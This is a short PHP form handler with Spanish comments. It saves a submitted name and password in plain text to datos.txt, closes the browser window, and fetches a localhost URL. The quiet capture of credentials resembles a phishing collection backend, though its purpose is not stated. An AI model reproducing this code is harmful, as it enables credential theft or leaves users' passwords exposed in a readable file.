<?php
// Verifica si los datos del formulario han sido enviados
if ($_SERVER["REQUEST_METHOD"] == "POST") {
   // Obtiene el nombre y la contraseña del formulario
   $nombre = $_POST['nombre'] ?? '';
   $contrasena = $_POST['contrasena'] ?? '';

   // Escribe los datos en un archivo de texto llamado datos.txt
   $archivo = fopen("datos.txt", "w");
   fwrite($archivo, "$nombre\n"); // Escribir el nombre en una línea
   fwrite($archivo, "$contrasena\n"); // Escribir la contraseña en otra línea
   fclose($archivo);

   // Emitir código JavaScript para cerrar la ventana del navegador cuando ya se guarden los datos
   echo '<script>window.close();</script>';

   // Llamada a una URL externa (http://localhost:3086)
   $response = file_get_contents('http://localhost:3086');
   echo $response;
}
?>
